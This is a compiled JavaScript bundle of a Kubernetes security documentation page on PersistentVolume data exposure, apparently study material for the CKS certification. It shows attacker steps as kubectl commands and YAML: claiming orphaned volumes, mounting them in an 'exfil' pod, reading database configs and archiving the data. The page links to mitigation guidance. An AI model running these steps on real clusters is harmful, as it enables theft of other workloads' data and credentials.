"use strict";(globalThis.webpackChunkk_8_s_security=globalThis.webpackChunkk_8_s_security||[]).push([[6684],{8453(e,t,s){s.d(t,{R:()=>i,x:()=>o});var a=s(6540);const n={},r=a.createContext(n);function i(e){const t=a.useContext(r);return a.useMemo(function(){return"function"==typeof e?e(t):{...t,...e}},[t,e])}function o(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(n):e.components||n:i(e.components),a.createElement(r.Provider,{value:t},e.children)}},9842(e,t,s){s.r(t),s.d(t,{assets:()=>c,contentTitle:()=>o,default:()=>u,frontMatter:()=>i,metadata:()=>a,toc:()=>l});const a=JSON.parse('{"id":"attack_vectors/persistent_volume_data_exposure","title":"Persistent Volume Data Exposure","description":"How attackers exploit misconfigured PersistentVolumes to access sensitive data from other workloads or previously deleted pods in Kubernetes.","source":"@site/docs/attack_vectors/persistent_volume_data_exposure.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/persistent_volume_data_exposure","permalink":"/docs/attack_vectors/persistent_volume_data_exposure","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/persistent_volume_data_exposure.md","tags":[{"inline":true,"label":"attack-vector","permalink":"/docs/tags/attack-vector"},{"inline":true,"label":"storage","permalink":"/docs/tags/storage"},{"inline":true,"label":"data-exposure","permalink":"/docs/tags/data-exposure"},{"inline":true,"label":"CKS","permalink":"/docs/tags/cks"}],"version":"current","lastUpdatedBy":"Itai Ganot","lastUpdatedAt":1770658335000,"sidebarPosition":24,"frontMatter":{"sidebar_position":24,"title":"Persistent Volume Data Exposure","description":"How attackers exploit misconfigured PersistentVolumes to access sensitive data from other workloads or previously deleted pods in Kubernetes.","keywords":["kubernetes security","persistent volume","PV security","storage security","data exposure","PVC attack","volume access","kubernetes storage","reclaim policy","CKS"],"tags":["attack-vector","storage","data-exposure","CKS"],"related":["/docs/best_practices/cluster_setup_and_hardening/pod_security/persistent_volume_security/","/docs/attack_vectors/unrestricted_hostpath_mounts/","/docs/attack_vectors/insecure_secrets_management/"]},"sidebar":"default","previous":{"title":"Ephemeral Debug Container Abuse","permalink":"/docs/attack_vectors/ephemeral_container_abuse"},"next":{"title":"Kubernetes Security Best Practices","permalink":"/docs/best_practices/intro"}}');var n=s(4848),r=s(8453);const i={sidebar_position:24,title:"Persistent Volume Data Exposure",description:"How attackers exploit misconfigured PersistentVolumes to access sensitive data from other workloads or previously deleted pods in Kubernetes.",keywords:["kubernetes security","persistent volume","PV security","storage security","data exposure","PVC attack","volume access","kubernetes storage","reclaim policy","CKS"],tags:["attack-vector","storage","data-exposure","CKS"],related:["/docs/best_practices/cluster_setup_and_hardening/pod_security/persistent_volume_security/","/docs/attack_vectors/unrestricted_hostpath_mounts/","/docs/attack_vectors/insecure_secrets_management/"]},o="Persistent Volume Data Exposure",c={},l=[{value:"Exploitation Steps",id:"exploitation-steps",level:2},{value:"1. Enumerate Available PersistentVolumes",id:"1-enumerate-available-persistentvolumes",level:3},{value:"2. Claim an Orphaned PersistentVolume",id:"2-claim-an-orphaned-persistentvolume",level:3},{value:"3. Mount the Volume and Extract Data",id:"3-mount-the-volume-and-extract-data",level:3},{value:"4. Exploit ReadWriteMany Volumes",id:"4-exploit-readwritemany-volumes",level:3},{value:"5. Access Data via Direct Volume Path",id:"5-access-data-via-direct-volume-path",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation",id:"mitigation",level:2},{value:"References",id:"references",level:2}];function d(e){const t={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(t.header,{children:(0,n.jsx)(t.h1,{id:"persistent-volume-data-exposure",children:"Persistent Volume Data Exposure"})}),"\n",(0,n.jsxs)(t.p,{children:[(0,n.jsx)(t.strong,{children:"PersistentVolumes (PVs)"})," in Kubernetes provide storage that persists beyond the lifecycle of individual pods. When improperly configured, PVs can expose sensitive data to unauthorized workloads. Common misconfigurations include using ",(0,n.jsx)(t.code,{children:"Retain"})," reclaim policies without clearing data, allowing ",(0,n.jsx)(t.code,{children:"ReadWriteMany"})," access modes, and failing to restrict volume access through RBAC."]}),"\n",(0,n.jsxs)(t.p,{children:["Attackers who gain the ability to create pods or PersistentVolumeClaims can ",(0,n.jsx)(t.strong,{children:"mount existing volumes, access data from other namespaces, or recover data from deleted workloads"}),"."]}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h2,{id:"exploitation-steps",children:"Exploitation Steps"}),"\n",(0,n.jsx)(t.p,{children:"An attacker with permissions to create pods or PVCs exploits storage misconfigurations to access sensitive data."}),"\n",(0,n.jsx)(t.h3,{id:"1-enumerate-available-persistentvolumes",children:"1. Enumerate Available PersistentVolumes"}),"\n",(0,n.jsx)(t.p,{children:"The attacker lists available PVs to identify potential targets:"}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-bash",children:"kubectl get pv -o wide\n"})}),"\n",(0,n.jsx)(t.p,{children:"Output reveals:"}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{children:"NAME       CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS      CLAIM\ndatabase   100Gi      RWO            Retain           Released    production/db-data\nlogs-pv    50Gi       RWX            Retain           Available   \nbackups    200Gi      RWO            Retain           Released    backup/daily\n"})}),"\n",(0,n.jsxs)(t.p,{children:["Volumes with ",(0,n.jsx)(t.code,{children:"Released"})," or ",(0,n.jsx)(t.code,{children:"Available"})," status and ",(0,n.jsx)(t.code,{children:"Retain"})," policy may contain data from previous workloads."]}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h3,{id:"2-claim-an-orphaned-persistentvolume",children:"2. Claim an Orphaned PersistentVolume"}),"\n",(0,n.jsx)(t.p,{children:"The attacker creates a PVC that binds to a released PV containing sensitive data:"}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-yaml",children:"apiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: stolen-data\n  namespace: attacker-namespace\nspec:\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 100Gi\n  volumeName: database\n"})}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-bash",children:"kubectl apply -f stolen-pvc.yaml\n"})}),"\n",(0,n.jsx)(t.p,{children:"If the PV allows binding, the attacker gains access to the previous workload's data."}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h3,{id:"3-mount-the-volume-and-extract-data",children:"3. Mount the Volume and Extract Data"}),"\n",(0,n.jsx)(t.p,{children:"The attacker creates a pod that mounts the claimed volume:"}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-yaml",children:'apiVersion: v1\nkind: Pod\nmetadata:\n  name: data-exfil\n  namespace: attacker-namespace\nspec:\n  containers:\n    - name: extractor\n      image: busybox\n      command: ["sleep", "infinity"]\n      volumeMounts:\n        - name: stolen-volume\n          mountPath: /data\n  volumes:\n    - name: stolen-volume\n      persistentVolumeClaim:\n        claimName: stolen-data\n'})}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-bash",children:"kubectl apply -f exfil-pod.yaml\nkubectl exec -it data-exfil -n attacker-namespace -- /bin/sh\n"})}),"\n",(0,n.jsx)(t.p,{children:"Inside the pod, the attacker accesses the data:"}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-bash",children:"ls -la /data/\ncat /data/config/database.conf\ntar -czf /tmp/exfil.tar.gz /data/\n"})}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h3,{id:"4-exploit-readwritemany-volumes",children:"4. Exploit ReadWriteMany Volumes"}),"\n",(0,n.jsxs)(t.p,{children:["If a PV uses ",(0,n.jsx)(t.code,{children:"ReadWriteMany"})," (RWX) access mode, multiple pods can mount it simultaneously. The attacker creates a pod that mounts the same volume as a production workload:"]}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-yaml",children:'apiVersion: v1\nkind: Pod\nmetadata:\n  name: shared-access\n  namespace: attacker-namespace\nspec:\n  containers:\n    - name: snooper\n      image: busybox\n      command: ["sleep", "infinity"]\n      volumeMounts:\n        - name: shared-data\n          mountPath: /shared\n  volumes:\n    - name: shared-data\n      persistentVolumeClaim:\n        claimName: shared-logs\n'})}),"\n",(0,n.jsx)(t.p,{children:"The attacker can now read or modify data written by other workloads."}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h3,{id:"5-access-data-via-direct-volume-path",children:"5. Access Data via Direct Volume Path"}),"\n",(0,n.jsx)(t.p,{children:"In cloud environments, the attacker may identify the underlying storage:"}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-bash",children:"kubectl get pv database -o jsonpath='{.spec.csi.volumeHandle}'\n"})}),"\n",(0,n.jsxs)(t.p,{children:["Output: ",(0,n.jsx)(t.code,{children:"vol-0abc123def456789"})]}),"\n",(0,n.jsx)(t.p,{children:"Using cloud credentials obtained through other attacks, they can attach this volume directly to a compromised instance."}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h3,{id:"result",children:"Result"}),"\n",(0,n.jsx)(t.p,{children:"The attacker achieves:"}),"\n",(0,n.jsxs)(t.ul,{children:["\n",(0,n.jsxs)(t.li,{children:[(0,n.jsx)(t.strong,{children:"Access to orphaned data"})," from deleted workloads"]}),"\n",(0,n.jsxs)(t.li,{children:[(0,n.jsx)(t.strong,{children:"Cross-namespace data access"})," via shared volumes"]}),"\n",(0,n.jsxs)(t.li,{children:[(0,n.jsx)(t.strong,{children:"Database credential theft"})," from configuration files"]}),"\n",(0,n.jsxs)(t.li,{children:[(0,n.jsx)(t.strong,{children:"Data modification"})," on RWX volumes affecting other workloads"]}),"\n",(0,n.jsxs)(t.li,{children:[(0,n.jsx)(t.strong,{children:"Compliance violations"})," through unauthorized data access"]}),"\n"]}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h2,{id:"mitigation",children:"Mitigation"}),"\n",(0,n.jsxs)(t.p,{children:["\u27a1 ",(0,n.jsx)(t.a,{href:"/docs/best_practices/cluster_setup_and_hardening/pod_security/persistent_volume_security/",children:"Securing Persistent Volumes"})]}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h2,{id:"references",children:"References"}),"\n",(0,n.jsx)(t.p,{children:"This article is based on information from the following official sources:"}),"\n",(0,n.jsxs)(t.ol,{children:["\n",(0,n.jsxs)(t.li,{children:[(0,n.jsx)(t.a,{href:"https://kubernetes.io/docs/concepts/storage/persistent-volumes/",children:"Persistent Volumes"})," - Kubernetes Documentation"]}),"\n",(0,n.jsxs)(t.li,{children:[(0,n.jsx)(t.a,{href:"https://kubernetes.io/docs/concepts/storage/storage-classes/",children:"Storage Classes"})," - Kubernetes Documentation"]}),"\n",(0,n.jsxs)(t.li,{children:[(0,n.jsx)(t.a,{href:"https://kubernetes.io/docs/tasks/configure-pod-container/configure-persistent-volume-storage/",children:"Configure a Pod to Use a PersistentVolume for Storage"})," - Kubernetes Documentation"]}),"\n"]})]})}function u(e={}){const{wrapper:t}={...(0,r.R)(),...e.components};return t?(0,n.jsx)(t,{...e,children:(0,n.jsx)(d,{...e})}):d(e)}}}]);